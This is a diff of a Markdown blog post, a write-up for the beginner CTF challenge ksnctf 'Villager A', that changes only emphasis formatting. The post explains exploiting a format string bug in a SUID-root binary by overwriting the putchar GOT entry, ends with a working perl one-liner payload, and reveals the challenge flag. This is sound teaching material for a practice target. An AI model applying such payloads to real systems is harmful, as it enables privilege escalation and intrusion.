@@ -7,7 +7,7 @@ title: ksnctf Villager A write-up
 [ksnctf](http://ksnctf.sweetduet.info) is one of the beginner level CTF websites. This article is the write-up for the question 4 [Villager A](http://ksnctf.sweetduet.info/problem/4), in which you need to exploit the *Format String Vulnerability* to capture the flag!  
 
 ## Write-up
-### _Connect_  
+### __Connect__  
 Using given information, access to the server `ssh -p 10022 q4@ctfq.sweetduet.info`  
 In the server, you can find
 ```
@@ -41,7 +41,7 @@ no
 I see. Good bye.
 ```
 
-### _Analyze_  
+### __Analyze__  
 Since I don't have an access to read flag.txt, it seems that I need to somehow exploit q4 (SUID=root) to read the file.  
 Let's disassemble main().  
 
@@ -87,7 +87,7 @@ Hi, sirius400d604408
 Do you want the flag?
 ```
 
-It's now clear that there is a format string vulnerability at _<main+72>_. So, let's think about how to exploit it to read flag.txt.  
+It's now clear that there is a format string vulnerability at __<main+72>__. So, let's think about how to exploit it to read flag.txt.  
   
 ```
 ...
@@ -152,7 +152,7 @@ On the other hand, if the jump was not taken, then it opens `flag.txt` and print
 One possibility to attack this program is by using format string attack to change the value of [esp+0x418] to 0 before `jne` at \<main+219\>, but it wouldn't work because `mov [esp+0x418], 0x1` happens after the string vulnerability. Moreover, ASLR (Address Space Layout Randomization) is enabled on this system, so guessing the stack address of [esp+0x418] is very hard.  
   
 
-### _Exploitation_  
+### __Exploitation__  
 Remember that ASLR doesn't disable the randomization of memory address of code section. If I can somehow set `eip` to \<main+221\> (0x08048691), I should be able to read `flag.txt`.  
 Right after the format string vulnerability, `putchar@plt` is called, using PLT. That means, if I modify the address referred at `putchar@plt` to \<main+221\>, I can modify `eip`!  
 Let's examine. 
@@ -177,7 +177,7 @@ Dump of assembler code for function putchar@plt:
 End of assembler dump.
 ```
 
-So, it seems that if I change the value stored at _0x80499e0_ to be _0x08048691_ (\<main+219\>), I can read flag.txt.  
+So, it seems that if I change the value stored at __0x80499e0__ to be __0x08048691__ (\<main+219\>), I can read flag.txt.  
   
 
 ```
@@ -188,12 +188,12 @@ Hi, AAAA400.cfa440.8.14.64dfc4.41414141.252e7825.78252e78.
 
 Do you want the flag?
 ```
-As examining the format vulnerability, it seems that the input string is stored at _6th place_ from the top of the stack.  
+As examining the format vulnerability, it seems that the input string is stored at __6th place__ from the top of the stack.  
 
 
-### _GETTING THE FLAG_
+### __GETTING THE FLAG__
 Now, we got all the informatin needed.
-* modify the value at _0x80499e0_ to _0x8048691_  
+* modify the value at __0x80499e0__ to __0x8048691__  
 * offset is 6  
 
 Some calculation  
@@ -208,4 +208,4 @@ Thus, the exploit code is
 ```
 [q4@localhost ~]$ perl -e 'print "\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6\$hn%33139x%7\$hn"'| ./q4
 ```
-Then, the flag was: _FLAG\_nwW6eP503Q3QI0zw_
+Then, the flag was: __FLAG\_nwW6eP503Q3QI0zw__
